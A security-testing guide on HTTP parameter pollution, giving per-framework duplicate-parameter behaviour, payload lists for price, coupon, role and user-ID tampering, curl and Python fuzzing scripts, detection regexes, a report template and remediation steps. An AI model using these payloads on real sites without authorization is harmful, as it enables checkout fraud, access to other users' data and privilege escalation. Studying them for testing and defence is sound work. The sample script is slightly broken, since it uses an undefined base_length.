# Parameter Pollution Testing Methodology

## Overview
HTTP Parameter Pollution (HPP) occurs when an application accepts duplicate parameters with different values and processes them in an unpredictable or insecure way. This can lead to logic bypasses, authentication bypasses, and business logic flaws.

## How Parameter Pollution Works

```
Normal Request:     /cart?product_id=1&quantity=1
Polluted Request:   /cart?product_id=1&product_id=2&quantity=1&quantity=999
```

Different technologies handle duplicate parameters differently:
| Technology | Behavior |
|------------|----------|
| PHP | Last wins (`$_GET['param']` = last value) |
| ASP.NET | First wins (`Request.QueryString["param"]` = first value) |
| Node/Express | Array (`req.query.param` = array) |
| Java/Servlet | First wins (`getParameter()` = first) |
| Python/Django | Last wins (`request.GET.get()` = last) |
| Go | First wins (`r.FormValue()` = first) |
| Ruby/Rails | Last wins (`params[:param]` = last) |
| Salesforce | Varies - often error or last wins |

## Testing Methodology

### 1. Basic Duplicate Parameter Test
```bash
# Normal
curl "https://target.com/cart?id=1"
# Duplicate
curl "https://target.com/cart?id=1&id=2"
# Triple
curl "https://target.com/cart?id=1&id=2&id=3"
```

### 2. Different Value Types
```bash
# Price manipulation
?price=100&price=0
?amount=10000&amount=1

# Quantity override
?quantity=1&quantity=999
?qty=1&qty=-1
?quantity=1&quantity=0

# Discount/coupon stacking
?coupon=SAVE10&coupon=SAVE100
?discount=10&discount=100

# User/role manipulation
?user_id=1&user_id=2
?role=user&role=admin

# Action confusion
?action=view&action=delete
?action=add&action=remove
```

### 3. Mixed Parameter Types
```bash
# Query + body pollution
POST /api/order
id=1&id=2
{"id": 1, "id": 2}

# Header + query
GET /api/order?id=1
X-Request-ID: 2
```

## Testing Categories

### Cart/E-commerce
```
?product_id=1&product_id=2
?quantity=1&quantity=999
?price=100&price=0
?discount=10&discount=100
?coupon=SAVE10&coupon=SAVE100
```

### User/Authorization
```
?user_id=1&user_id=2
?role=user&role=admin
?permission=read&permission=write
```

### Search/Filter
```
?filter=active&filter=deleted
?category=electronics&category=all
?status=active&status=deleted
```

### Pagination/Limits
```
?limit=10&limit=1000
?offset=0&offset=-1
?page=1&page=999
```

## Testing Methodology

### 1. Discovery Phase
```bash
# Find endpoints with parameters
grep -r "?" urls.txt | cut -d'?' -f2 | sort -u

# Find parameters
cat urls.txt | qsreplace | grep -oP '\w+(?==)' | sort -u
```

### 2. Manual Testing
```bash
# Normal request
curl "https://target.com/cart?product_id=1"

# Polluted
curl "https://target.com/cart?product_id=1&product_id=2"

# Compare responses
diff normal.html polluted.html
```

### 3. Automated Testing
```python
import requests
from urllib.parse import urlencode

def test_param_pollution(base_url, param, values):
    """Test parameter pollution with duplicate values"""
    for i in range(2, len(values)+1):
        params = {param: values[:i]}
        # Convert to duplicate params
        query = '&'.join([f"{param}={v}" for v in values[:i]])
        url = f"{base_url}?{query}"
        r = requests.get(url)
        yield r
```

## Detection Criteria

### Error Leakage
```
- "Duplicate parameter"
- "Invalid parameter"
- "Multiple values"
- "Array to string conversion"
- "Cannot use scalar value as array"
- Null pointer / null reference
- Array to string conversion
- Invalid argument supplied for foreach
```

### Logic Changes
- Different response length
- Different items in cart/response
- Price/total changes
- Different items returned
- Error messages leak stack traces

### Behavior Changes
- Different items in cart
- Price calculation changes
- Coupon applied/removed
- Quantity changes
- User context changes

## Exploitation Scenarios

### 1. Price Manipulation
```
?price=1000&price=0 → $0 checkout
?amount=10000&amount=1 → $1 for $10k item
```

### 2. Quantity Override
```
?quantity=1&quantity=999 → 999 items for price of 1
?quantity=1&quantity=-1 → Negative quantity (refund?)
```

### 3. Coupon Stacking
```
?coupon=SAVE10&coupon=SAVE100 → 110% discount
?discount=10&discount=100 → 110% discount
```

### 4. IDOR via Parameter Pollution
```
?user_id=1&user_id=2 → Access user 2's data
?order_id=100&order_id=101 → Access order 101
```

### 5. Role/Privilege Escalation
```
?role=user&role=admin
?permission=read&permission=write
```

### 6. Action Confusion
```
?action=view&action=delete
?action=add&action=remove
?mode=read&mode=write
```

## Testing Automation

### Python Script
```python
import requests
from itertools import combinations

def test_param_pollution(base_url, param, test_values):
    """Test parameter pollution with various combinations"""
    findings = []
    
    for i in range(2, len(test_values)+1):
        for combo in combinations(test_values, i):
            # Build query with duplicates
            query = '&'.join([f"{param}={v}" for v in combo])
            url = f"{base_url}?{query}"
            
            r = requests.get(url, timeout=10)
            
            # Check for errors/leaks
            if r.status_code >= 500:
                yield {"type": "server_error", "params": combo, "status": r.status_code}
            
            # Check for logic changes
            if "error" in r.text.lower() or "exception" in r.text.lower():
                yield {"type": "error_leak", "params": combo, "snippet": r.text[:200]}
            
            # Check for logic changes
            if len(r.text) != base_length:
                yield {"type": "length_change", "params": combo, "length": len(r.text)}

# Usage
base = "https://target.com/cart"
test_param_pollution(base, "product_id", ["1", "2", "3"])
```

### Burp Suite Extension
```
# In Burp Intruder
Position: Query parameter
Payload: Multiple payload sets
- Payload 1: product_id=1
- Payload 2: product_id=2
- Payload 3: product_id=1&product_id=2
```

## Framework-Specific Behaviors

| Framework | Duplicate Param Behavior |
|-----------|-------------------------|
| PHP | Last wins |
| Node/Express | Array |
| Python/Django | Last wins (QueryDict) |
| Flask | ImmutableMultiDict (last wins) |
| Ruby/Rails | Last wins (ActionController::Parameters) |
| Java Spring | First wins (getParameter) |
| ASP.NET Core | Array (GetValues) |
| Go | First wins (FormValue) |
| Ruby/Rails | Last wins |
| Salesforce Apex | Last wins / Error |

## Detection Patterns

### Server-Side Errors
```regex
(?i)(duplicate|multiple|array|scalar|conversion|null pointer|null reference|invalid parameter|multiple values)
```

### Logic Changes
```regex
(?i)(price|amount|total|cost|quantity|qty|discount|coupon|price|amount|total)
```

### Error Patterns
```regex
(?i)(duplicate|multiple|array|scalar|conversion|null|exception|error|stack trace)
```

## Reporting Template

### Finding: Parameter Pollution → Logic Bypass
**Severity**: High (CVSS 7.5)
**Component**: [Endpoint]
**Parameter**: [Parameter name]
**Payload**: `?param=value1&param=value2`

**Proof of Concept**:
```bash
curl "https://target.com/cart?price=100&price=0"
# Returns $0 total
```

**Impact**:
- Price manipulation → $0 checkout
- Quantity override → 999 items for $1
- Coupon stacking → 110% discount
- IDOR via user_id pollution

**Remediation**:
1. Reject duplicate parameters (400 Bad Request)
2. Use first/last value consistently
3. Validate parameter count
4. Use strict parameter parsing libraries that reject duplicates
5. Implement parameter validation middleware

## Tools
- **Burp Intruder**: Multiple payload positions
- **Param Miner**: Automated parameter discovery
- **Arjun**: Parameter discovery
- **Parameth**: Parameter pollution testing
- **Custom scripts**: Python/Go for specific logic